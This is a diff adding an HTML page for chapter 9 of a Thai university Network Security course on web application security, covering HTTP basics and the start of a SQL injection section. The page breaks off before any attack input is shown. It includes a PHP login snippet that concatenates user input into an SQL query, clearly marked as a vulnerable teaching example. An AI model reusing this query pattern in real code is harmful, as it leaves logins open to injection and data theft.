@@ -1,0 +1,1509 @@
+<!DOCTYPE html>
+<html lang="th" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CH-9: การรักษาความปลอดภัยสำหรับเว็บและแอปพลิเคชัน | วิชา Network Security</title>
+<meta name="description" content="บทที่ 9 วิชา Network Security — การรักษาความปลอดภัยสำหรับเว็บและแอปพลิเคชัน: SQL Injection, XSS, CSRF, SSRF, Same-Origin Policy, CORS, WAF, HTTP Security Headers, TLS/SSL, กรณีศึกษาการโจมตีเว็บไซต์จริง">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "LearningResource",
+  "name": "CH-9: การรักษาความปลอดภัยสำหรับเว็บและแอปพลิเคชัน",
+  "description": "บทที่ 9 ของวิชา Network Security — ครอบคลุม SQL Injection, XSS, CSRF, SSRF, Same-Origin Policy, CORS, WAF, ModSecurity, OWASP CRS, HTTP Security Headers, HSTS, CSP, TLS/SSL on Web Server, กรณีศึกษาการโจมตีเว็บไซต์จริง",
+  "educationalLevel": "Undergraduate",
+  "educationalRole": "Instructor",
+  "teaches": [
+    "SQL Injection",
+    "Cross-Site Scripting (XSS)",
+    "Cross-Site Request Forgery (CSRF)",
+    "Server-Side Request Forgery (SSRF)",
+    "Same-Origin Policy",
+    "Cross-Origin Resource Sharing (CORS)",
+    "Web Application Firewall (WAF)",
+    "ModSecurity",
+    "OWASP Core Rule Set",
+    "HTTP Strict Transport Security (HSTS)",
+    "Content Security Policy (CSP)",
+    "X-Frame-Options",
+    "X-Content-Type-Options",
+    "TLS/SSL",
+    "TLS Termination",
+    "OWASP Top 10"
+  ],
+  "inLanguage": "th"
+}
+</script>
+<style>
+:root{--primary:#1a3a5c;--primary-dark:#0f2440;--primary-light:#2c5a8c;--accent:#2563eb;--accent-hover:#1d4ed8;--bg:#ffffff;--bg-secondary:#f8fafc;--bg-tertiary:#f1f5f9;--text:#1e293b;--text-secondary:#475569;--text-muted:#94a3b8;--border:#e2e8f0;--border-light:#f1f5f9;--code-bg:#0f172a;--code-text:#e2e8f0;--table-stripe:#f8fafc;--sidebar-bg:#f8fafc;--sidebar-border:#e2e8f0;--shadow:0 1px 3px rgba(0,0,0,0.08),0 1px 2px rgba(0,0,0,0.06);--shadow-lg:0 10px 15px -3px rgba(0,0,0,0.1),0 4px 6px -2px rgba(0,0,0,0.05);--radius:8px;--radius-sm:4px;--radius-lg:12px;--font-thai:'Sarabun','IBM Plex Sans Thai','Kanit','Noto Sans Thai',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;--font-mono:'JetBrains Mono','Fira Code','Cascadia Code','Source Code Pro','Menlo','Consolas',monospace;--transition:0.2s ease;--header-height:64px;--toc-width:280px}
+[data-theme="dark"]{--primary:#60a5fa;--primary-dark:#1e3a5f;--accent:#3b82f6;--accent-hover:#60a5fa;--bg:#0f172a;--bg-secondary:#1e293b;--bg-tertiary:#334155;--text:#f1f5f9;--text-secondary:#cbd5e1;--text-muted:#64748b;--border:#334155;--code-bg:#020617;--table-stripe:#1e293b;--sidebar-bg:#1e293b;--sidebar-border:#334155;--shadow:0 1px 3px rgba(0,0,0,0.3);--shadow-lg:0 10px 15px -3px rgba(0,0,0,0.4)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{font-family:var(--font-thai);background:var(--bg);color:var(--text);line-height:1.75;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:var(--accent);text-decoration:none;transition:color .2s ease}
+a:hover{color:var(--accent-hover);text-decoration:underline}
+h1,h2,h3,h4,h5,h6{line-height:1.3;font-weight:700;color:var(--text);margin-top:1.5em;margin-bottom:.75em}
+h1{font-size:2.25rem;margin-top:0}
+h2{font-size:1.75rem;border-bottom:2px solid var(--border);padding-bottom:.4em}
+h3{font-size:1.35rem}
+h4{font-size:1.1rem}
+p{margin-bottom:1em}
+hr{border:none;border-top:2px solid var(--border);margin:2.5em 0}
+strong,b{font-weight:700}
+ul,ol{margin-bottom:1em;padding-left:1.5em}
+li{margin-bottom:.35em}
+#loading-screen{position:fixed;inset:0;z-index:99999;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s ease,visibility .5s ease}
+#loading-screen.hidden{opacity:0;visibility:hidden;pointer-events:none}
+.loading-spinner{width:48px;height:48px;border:4px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin-bottom:1rem}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{color:var(--text-secondary);font-size:1rem}
+#progress-bar{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--accent),#818cf8);z-index:9998;width:0%;transition:width .15s ease-out}
+.top-nav{position:fixed;top:3px;left:0;right:0;z-index:9997;height:var(--header-height);background:var(--bg);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 1.25rem;backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+.top-nav .logo{display:flex;align-items:center;gap:.6rem;font-weight:700;font-size:1rem;color:var(--text);white-space:nowrap}
+.top-nav .logo i{color:var(--accent);font-size:1.3rem}
+.nav-actions{display:flex;align-items:center;gap:.75rem}
+.nav-actions button,.nav-actions .search-toggle{background:none;border:1px solid var(--border);color:var(--text-secondary);width:40px;height:40px;border-radius:var(--radius);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s ease;font-size:1rem}
+.nav-actions button:hover,.nav-actions .search-toggle:hover{background:var(--bg-tertiary);color:var(--text);border-color:var(--text-muted)}
+#sidebar-toggle{display:none;background:none;border:1px solid var(--border);color:var(--text-secondary);width:40px;height:40px;border-radius:var(--radius);cursor:pointer;font-size:1.1rem;align-items:center;justify-content:center}
+.search-overlay{position:fixed;inset:0;z-index:9996;background:rgba(0,0,0,.5);display:none;align-items:flex-start;justify-content:center;padding-top:80px;backdrop-filter:blur(4px)}
+.search-overlay.active{display:flex}
+.search-panel{background:var(--bg);border-radius:var(--radius-lg);box-shadow:var(--shadow-lg);width:90%;max-width:640px;overflow:hidden;max-height:70vh;display:flex;flex-direction:column}
+.search-input-wrap{display:flex;align-items:center;padding:.75rem 1rem;border-bottom:1px solid var(--border);gap:.5rem}
+.search-input-wrap i{color:var(--text-muted)}
+.search-input-wrap input{flex:1;border:none;outline:none;background:transparent;color:var(--text);font-size:1rem;font-family:var(--font-thai)}
+.search-input-wrap input::placeholder{color:var(--text-muted)}
+.search-count{font-size:.8rem;color:var(--text-muted);white-space:nowrap;padding:.25rem .5rem;background:var(--bg-tertiary);border-radius:var(--radius-sm)}
+.search-results{overflow-y:auto;padding:.5rem;flex:1;max-height:50vh}
+.search-results .no-results{padding:2rem;text-align:center;color:var(--text-muted)}
+.search-result-item{padding:.75rem;border-radius:var(--radius);cursor:pointer;transition:background .2s ease;border-bottom:1px solid var(--border-light)}
+.search-result-item:hover{background:var(--bg-tertiary)}
+.search-result-item .result-heading{font-weight:600;font-size:.9rem;color:var(--accent);margin-bottom:.2rem}
+.search-result-item .result-snippet{font-size:.85rem;color:var(--text-secondary);line-height:1.5}
+.search-result-item .result-snippet mark,.highlight{background:#fef08a;color:#1e293b;padding:0 2px;border-radius:2px}
+[data-theme="dark"] .search-result-item .result-snippet mark,[data-theme="dark"] .highlight{background:#854d0e;color:#fef9c3}
+.layout{display:flex;padding-top:calc(var(--header-height) + 3px);min-height:100vh}
+.sidebar{width:var(--toc-width);flex-shrink:0;position:sticky;top:calc(var(--header-height) + 3px);height:calc(100vh - var(--header-height) - 3px);overflow-y:auto;background:var(--sidebar-bg);border-right:1px solid var(--sidebar-border);padding:1.25rem 1rem;scrollbar-width:thin;scrollbar-color:var(--text-muted) transparent;z-index:100}
+.sidebar::-webkit-scrollbar{width:4px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--text-muted);border-radius:4px}
+.sidebar-title{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);font-weight:600;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.toc-list{list-style:none;padding:0;margin:0}
+.toc-item{margin-bottom:.15rem}
+.toc-link{display:block;padding:.4rem .6rem;border-radius:var(--radius-sm);font-size:.85rem;color:var(--text-secondary);transition:all .2s ease;border-left:3px solid transparent;text-decoration:none;line-height:1.4}
+.toc-link:hover{background:var(--bg-tertiary);color:var(--text);text-decoration:none}
+.toc-link.active{color:var(--accent);background:rgba(37,99,235,.08);border-left-color:var(--accent);font-weight:600}
+.toc-link.sub{padding-left:1.4rem;font-size:.8rem}
+.toc-link.sub2{padding-left:2.2rem;font-size:.78rem}
+.main-content{flex:1;min-width:0;padding:2rem 2.5rem;max-width:calc(100vw - var(--toc-width))}
+.main-content>section{margin-bottom:2.5rem}
+.section-ref{scroll-margin-top:calc(var(--header-height) + 16px)}
+.hero{background:linear-gradient(135deg,var(--primary-dark),var(--primary));color:#fff;padding:2.5rem 2rem;border-radius:var(--radius-lg);margin-bottom:2.5rem}
+.hero h1{color:#fff;font-size:2rem;margin-bottom:.5rem}
+.hero .subtitle{color:rgba(255,255,255,.85);font-size:1.1rem;margin-bottom:1.25rem}
+.hero .meta-tags{display:flex;flex-wrap:wrap;gap:.5rem}
+.hero .meta-tag{background:rgba(255,255,255,.15);color:rgba(255,255,255,.9);padding:.25rem .75rem;border-radius:20px;font-size:.8rem}
+.learning-objectives{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem 2rem;margin-bottom:2rem}
+.learning-objectives h3{margin-top:0;font-size:1.1rem;color:var(--accent);display:flex;align-items:center;gap:.5rem}
+.learning-objectives ol{margin:.75rem 0 0;padding-left:1.25rem}
+.learning-objectives li{margin-bottom:.5rem;color:var(--text-secondary);font-size:.95rem}
+.table-wrap{overflow-x:auto;margin:1.25em 0;border-radius:var(--radius);border:1px solid var(--border)}
+table{width:100%;border-collapse:collapse;font-size:.9rem;min-width:500px}
+thead{background:var(--bg-tertiary)}
+th,td{padding:.6rem .85rem;text-align:left;border:1px solid var(--border);vertical-align:top}
+th{font-weight:700;color:var(--text)}
+tbody tr:nth-child(even){background:var(--table-stripe)}
+tbody tr:hover{background:var(--bg-tertiary)}
+pre{background:var(--code-bg);color:var(--code-text);border-radius:var(--radius);padding:1rem 1.25rem;overflow-x:auto;font-family:var(--font-mono);font-size:.8rem;line-height:1.6;margin:1.25em 0;position:relative}
+pre code{background:none;padding:0;color:inherit;font-size:inherit}
+code{background:var(--bg-tertiary);color:var(--accent);padding:.15em .4em;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:.85em}
+.copy-btn{position:absolute;top:.5rem;right:.5rem;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:rgba(255,255,255,.7);padding:.3rem .6rem;border-radius:var(--radius-sm);font-size:.75rem;cursor:pointer;transition:all .2s ease;opacity:0}
+pre:hover .copy-btn{opacity:1}
+.copy-btn:hover{background:rgba(255,255,255,.2);color:#fff}
+.copy-btn.copied{background:#22c55e;color:#fff;border-color:#22c55e}
+.expandable{margin:1.25em 0}
+.expandable-header{display:flex;align-items:center;justify-content:space-between;padding:.75rem 1rem;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:all .2s ease;user-select:none;font-weight:600;font-size:.95rem}
+.expandable-header:hover{background:var(--border)}
+.expandable-header i{transition:transform .2s ease;font-size:.85rem;color:var(--text-muted)}
+.expandable.expanded .expandable-header i{transform:rotate(180deg)}
+.expandable-content{max-height:0;overflow:hidden;transition:max-height .35s ease,padding .35s ease;border:1px solid transparent}
+.expandable.expanded .expandable-content{max-height:50000px;padding:1rem;border-color:var(--border);border-top:none;border-radius:0 0 var(--radius) var(--radius)}
+.quiz-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:1.25rem 1.5rem;margin-bottom:1rem;transition:all .2s ease}
+.quiz-card.revealed{border-left:4px solid #22c55e}
+.quiz-question{display:flex;gap:.75rem;align-items:flex-start}
+.q-number{background:var(--accent);color:#fff;font-weight:700;font-size:.8rem;padding:.15rem .65rem;border-radius:20px;white-space:nowrap;flex-shrink:0}
+.quiz-question p{margin:0;font-weight:500;color:var(--text);font-size:.95rem}
+.quiz-card .reveal-btn{display:inline-flex;align-items:center;gap:.4rem;margin-top:.75rem;padding:.4rem 1rem;background:var(--accent);color:#fff;border:none;border-radius:var(--radius);cursor:pointer;font-size:.85rem;font-family:var(--font-thai);transition:all .2s ease}
+.quiz-card .reveal-btn:hover{background:var(--accent-hover)}
+.quiz-card.revealed .reveal-btn{background:var(--text-muted)}
+.quiz-answer{margin-top:.75rem;padding:1rem;background:var(--bg-tertiary);border-radius:var(--radius);border:1px solid var(--border);font-size:.9rem}
+.hidden{display:none}
+#back-to-top{position:fixed;bottom:2rem;right:2rem;z-index:9995;width:44px;height:44px;border-radius:50%;background:var(--accent);color:#fff;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1.1rem;box-shadow:var(--shadow-lg);transition:all .2s ease;opacity:0;visibility:hidden;transform:translateY(10px)}
+#back-to-top.visible{opacity:1;visibility:visible;transform:translateY(0)}
+#back-to-top:hover{background:var(--accent-hover);transform:translateY(-2px)}
+.site-footer{margin-top:3rem;padding:1.5rem 2rem;background:var(--bg-secondary);border-top:1px solid var(--border);text-align:center;color:var(--text-muted);font-size:.85rem}
+@media print{.top-nav,.sidebar,#back-to-top,#progress-bar,.copy-btn,.search-overlay,#sidebar-toggle,.nav-actions{display:none!important}.layout{display:block;padding-top:0}.main-content{max-width:100%;padding:0}.hero{background:#1a3a5c!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}.hero h1,.hero .subtitle{color:#fff!important}table{font-size:.8rem}pre{white-space:pre-wrap;word-break:break-all}.expandable-content{max-height:none!important;padding:1rem!important;border-color:var(--border)!important}.expandable-header i{display:none}.table-wrap{overflow:visible}.quiz-answer.hidden{display:block!important}.quiz-card .reveal-btn{display:none}body{font-size:11pt}section{page-break-inside:avoid}h2,h3{page-break-after:avoid}}
+@media(max-width:1024px){:root{--toc-width:240px}.main-content{padding:1.5rem}}
+@media(max-width:768px){:root{--toc-width:0px}#sidebar-toggle{display:flex}.sidebar{position:fixed;left:-280px;top:calc(var(--header-height) + 3px);width:280px;height:calc(100vh - var(--header-height) - 3px);transition:left .3s ease;z-index:9990;box-shadow:var(--shadow-lg)}.sidebar.open{left:0}.sidebar-overlay{position:fixed;inset:0;z-index:9989;background:rgba(0,0,0,.4);display:none}.sidebar-overlay.active{display:block}.main-content{max-width:100%;padding:1rem}.hero{padding:1.5rem 1rem}.hero h1{font-size:1.5rem}h2{font-size:1.4rem}h3{font-size:1.15rem}.top-nav{padding:0 .75rem}.top-nav .logo{font-size:.85rem}table{font-size:.8rem}th,td{padding:.4rem .6rem}.quiz-card{padding:1rem}}
+@media(max-width:480px){.nav-actions button,.nav-actions .search-toggle{width:36px;height:36px}#back-to-top{bottom:1rem;right:1rem;width:40px;height:40px}.search-panel{width:95%}}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+</style>
+</head>
+<body>
+<div id="loading-screen" role="status" aria-label="กำลังโหลดเนื้อหา">
+  <div class="loading-spinner" aria-hidden="true"></div>
+  <div class="loading-text">กำลังโหลดเนื้อหา...</div>
+</div>
+<div id="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" aria-label="ความคืบหน้าการอ่าน"></div>
+<header class="top-nav" role="banner">
+  <div style="display:flex;align-items:center;gap:0.5rem;">
+    <button id="sidebar-toggle" aria-label="เปิดเมนูสารบัญ" aria-expanded="false"><i class="fas fa-bars"></i></button>
+    <div class="logo"><i class="fas fa-shield-halved" aria-hidden="true"></i><span>Network Security — บทที่ 9</span></div>
+  </div>
+  <div class="nav-actions">
+    <button class="search-toggle" id="search-toggle-btn" aria-label="ค้นหา" title="ค้นหา (Ctrl+K / ⌘K)"><i class="fas fa-search" aria-hidden="true"></i></button>
+    <button id="dark-mode-toggle" aria-label="สลับโหมดมืด/สว่าง" title="สลับโหมดมืด/สว่าง"><i class="fas fa-moon" aria-hidden="true"></i></button>
+  </div>
+</header>
+<div class="search-overlay" id="search-overlay" role="dialog" aria-label="ค้นหาเนื้อหา">
+  <div class="search-panel">
+    <div class="search-input-wrap">
+      <i class="fas fa-search" aria-hidden="true"></i>
+      <input type="text" id="search-input" placeholder="ค้นหาในเนื้อหาทั้งหมด..." aria-label="ป้อนคำค้นหา" autocomplete="off">
+      <span class="search-count" id="search-count"></span>
+      <button id="search-close-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:1.1rem;" aria-label="ปิดค้นหา"><i class="fas fa-times"></i></button>
+    </div>
+    <div class="search-results" id="search-results"></div>
+  </div>
+</div>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+<nav class="sidebar" id="sidebar" role="navigation" aria-label="สารบัญ">
+  <div class="sidebar-title"><i class="fas fa-list" aria-hidden="true"></i> สารบัญ</div>
+  <ul class="toc-list" id="toc-list">
+    <li class="toc-item"><a class="toc-link" href="#hero-section" data-target="hero-section">บทนำ</a></li>
+    <li class="toc-item"><a class="toc-link" href="#learning-objectives" data-target="learning-objectives">วัตถุประสงค์การเรียนรู้</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section1" data-target="section1">1. ภาพรวม Web App Security</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-1" data-target="section1-1">1.1 Web App เป็นเป้าหมาย</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section1-2" data-target="section1-2">1.2 พื้นฐาน HTTP</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section2" data-target="section2">2. SQL Injection (SQLi)</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-1" data-target="section2-1">2.1 หลักการ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-2" data-target="section2-2">2.2 ตัวอย่างการโจมตี</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-3" data-target="section2-3">2.3 ประเภท SQLi</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section2-4" data-target="section2-4">2.4 แนวทางป้องกัน</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section3" data-target="section3">3. Cross-Site Scripting (XSS)</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-1" data-target="section3-1">3.1 หลักการ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-2" data-target="section3-2">3.2 ประเภท XSS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-3" data-target="section3-3">3.3 ตารางเปรียบเทียบ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section3-4" data-target="section3-4">3.4 แนวทางป้องกัน</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section4" data-target="section4">4. CSRF</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-1" data-target="section4-1">4.1 หลักการ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-2" data-target="section4-2">4.2 ตัวอย่างโจมตี</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-3" data-target="section4-3">4.3 เงื่อนไข CSRF</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section4-4" data-target="section4-4">4.4 แนวทางป้องกัน</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section5" data-target="section5">5. SSRF</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-1" data-target="section5-1">5.1 หลักการ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-2" data-target="section5-2">5.2 ตัวอย่างโจมตี</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-3" data-target="section5-3">5.3 ประเภท SSRF</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section5-4" data-target="section5-4">5.4 แนวทางป้องกัน</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section6" data-target="section6">6. การโจมตีทางเว็บอื่นๆ</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-1" data-target="section6-1">6.1 LFI / RFI</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-2" data-target="section6-2">6.2 Command Injection</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-3" data-target="section6-3">6.3 Path Traversal</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section6-4" data-target="section6-4">6.4 Insecure Deserialization</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section7" data-target="section7">7. SOP และ CORS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-1" data-target="section7-1">7.1 Same-Origin Policy</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-2" data-target="section7-2">7.2 ข้อยกเว้น SOP</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-3" data-target="section7-3">7.3 CORS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section7-4" data-target="section7-4">7.4 แนวทาง CORS</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section8" data-target="section8">8. WAF</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-1" data-target="section8-1">8.1 หลักการทำงาน</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-2" data-target="section8-2">8.2 โหมดการทำงาน</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-3" data-target="section8-3">8.3 ประเภท WAF</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-4" data-target="section8-4">8.4 ModSecurity + CRS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section8-5" data-target="section8-5">8.5 WAF Bypass</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section9" data-target="section9">9. HTTP Security Headers</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-1" data-target="section9-1">9.1 ภาพรวม</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-2" data-target="section9-2">9.2 HSTS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-3" data-target="section9-3">9.3 X-Frame-Options</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-4" data-target="section9-4">9.4 X-Content-Type-Options</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-5" data-target="section9-5">9.5 CSP</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-6" data-target="section9-6">9.6 CSP Directives</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-7" data-target="section9-7">9.7 ตัวอย่าง CSP</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-8" data-target="section9-8">9.8 Nonce ใน CSP</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section9-9" data-target="section9-9">9.9 Nginx Config</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section10" data-target="section10">10. TLS/SSL บนเว็บเซิร์ฟเวอร์</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section10-1" data-target="section10-1">10.1 TLS Termination</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section10-2" data-target="section10-2">10.2 TLS Configuration</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section10-3" data-target="section10-3">10.3 Certificate Mgmt</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section10-4" data-target="section10-4">10.4 ตรวจสอบ TLS</a></li>
+    <li class="toc-item"><a class="toc-link" href="#section11" data-target="section11">11. กรณีศึกษา</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section11-1" data-target="section11-1">11.1 Equifax Breach</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section11-2" data-target="section11-2">11.2 GitHub DDoS</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section11-3" data-target="section11-3">11.3 SolarWinds</a></li>
+    <li class="toc-item"><a class="toc-link sub" href="#section11-4" data-target="section11-4">11.4 OWASP Attack</a></li>
+    <li class="toc-item"><a class="toc-link" href="#summary" data-target="summary">สรุปท้ายบท</a></li>
+    <li class="toc-item"><a class="toc-link" href="#review-questions" data-target="review-questions">คำถามทบทวน</a></li>
+    <li class="toc-item"><a class="toc-link" href="#references" data-target="references">เอกสารอ้างอิง</a></li>
+  </ul>
+</nav>
+<main class="main-content" id="main-content" role="main">
+
+<section id="hero-section" class="hero section-ref">
+  <h1><i class="fas fa-shield-halved" aria-hidden="true"></i> CH-9: การรักษาความปลอดภัยสำหรับเว็บและแอปพลิเคชัน</h1>
+  <p class="subtitle">Web Application Security — SQL Injection, XSS, CSRF, SSRF, Same-Origin Policy, CORS, WAF, HTTP Security Headers, TLS/SSL, กรณีศึกษาการโจมตีเว็บไซต์จริง</p>
+  <div class="meta-tags">
+    <span class="meta-tag"><i class="fas fa-graduation-cap" aria-hidden="true"></i> วิชา Network Security</span>
+    <span class="meta-tag"><i class="fas fa-calendar" aria-hidden="true"></i> ภาคเรียนที่ 1/2569</span>
+    <span class="meta-tag"><i class="fas fa-book-open" aria-hidden="true"></i> บทที่ 9</span>
+  </div>
+</section>
+<div class="learning-objectives section-ref" id="learning-objectives">
+  <h3><i class="fas fa-bullseye" aria-hidden="true"></i> วัตถุประสงค์การเรียนรู้ (Learning Objectives)</h3>
+  <p>เมื่อจบบทนี้แล้ว ผู้เรียนสามารถ:</p>
+  <ol>
+    <li>อธิบายภัยคุกคามทางเว็บที่สำคัญ — SQL Injection, XSS, CSRF, SSRF — และแนวทางการป้องกันได้</li>
+    <li>อธิบายหลักการ Same-Origin Policy และการทำงานของ CORS ได้</li>
+    <li>อธิบายการทำงานของ TLS/SSL บนเว็บเซิร์ฟเวอร์ รวมถึง TLS Termination และ Offloading ได้</li>
+    <li>กำหนดค่า Web Application Firewall (WAF) เพื่อป้องกันการโจมตีทางเว็บได้</li>
+    <li>กำหนดค่า HTTP Security Headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options) ได้</li>
+    <li>เขียน Content Security Policy (CSP) ที่เหมาะสมกับแอปพลิเคชันได้</li>
+    <li>วิเคราะห์กรณีศึกษาการโจมตีเว็บไซต์จริงและเสนอแนวทางการป้องกันได้</li>
+  </ol>
+</div>
+<hr>
+
+<!-- SECTION 1 -->
+<section id="section1" class="section-ref">
+<h3>ส่วนที่ 1: ภัยคุกคามทางเว็บ</h3>
+<h2>1. ภาพรวมของ Web Application Security</h2>
+<h3 id="section1-1" class="section-ref">1.1 เหตุใด Web Application จึงตกเป็นเป้าหมาย</h3>
+<ul>
+  <li>เว็บแอปพลิเคชันเข้าถึงได้จากอินเทอร์เน็ต — ทุกคนสามารถโจมตีได้</li>
+  <li>ช่องโหว่ Web แพร่หลาย — OWASP Top 10 แสดงให้เห็นถึงปัญหาที่เกิดซ้ำแล้วซ้ำเล่า</li>
+  <li>ผลกระทบรุนแรง — ข้อมูลผู้ใช้, ข้อมูลบัตรเครดิต, Credentials, ระบบภายใน</li>
+</ul>
+<h3 id="section1-2" class="section-ref">1.2 พื้นฐาน HTTP Protocol</h3>
+<p>HTTP (HyperText Transfer Protocol) เป็น Protocol แบบ Request-Response ที่ไม่มี State (Stateless):</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>HTTP Request Structure:
+───────────────────────
+POST /login HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=abc123
+
+username=admin&amp;password=secret
+
+HTTP Response Structure:
+────────────────────────
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: session=xyz789; HttpOnly; Secure
+
+&lt;html&gt;Welcome, admin!&lt;/html&gt;</pre>
+<p><strong>ความปลอดภัยของ HTTP:</strong></p>
+<ul>
+  <li>HTTP ปกติ (Port 80) — ไม่เข้ารหัส — ทุกคนที่อยู่บนเส้นทางสามารถอ่านได้</li>
+  <li>HTTPS (HTTP over TLS — Port 443) — เข้ารหัสด้วย TLS — ป้องกัน Eavesdropping และ Tampering</li>
+</ul>
+</section>
+<hr>
+
+<!-- SECTION 2 -->
+<section id="section2" class="section-ref">
+<h2>2. SQL Injection (SQLi)</h2>
+<h3 id="section2-1" class="section-ref">2.1 หลักการ</h3>
+<p>SQL Injection เกิดเมื่อผู้โจมตีสามารถแทรกคำสั่ง SQL ผ่าน Input ที่ผู้ใช้สามารถควบคุมได้ เข้าไปยัง Database Query โดยตรง — ถ้าแอปพลิเคชันไม่ได้ทำ Sanitization หรือใช้ Parameterized Query</p>
+<h3 id="section2-2" class="section-ref">2.2 ตัวอย่างการโจมตี</h3>
+<p><strong>ช่องโหว่ — Dynamic Query Construction:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// ❌ ช่องโหว่ — ไม่ใช้ Parameterized Query
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysqli_query($conn, $query);
+
+if (mysqli_num_rows($result) &gt; 0) {
+    echo "Login successful!";
+} else {
+    echo "Login failed!";
+}
+?&gt;</pre>
+<p><strong>การโจมตี — ผู้ใช้ป้อน:</strong></p>
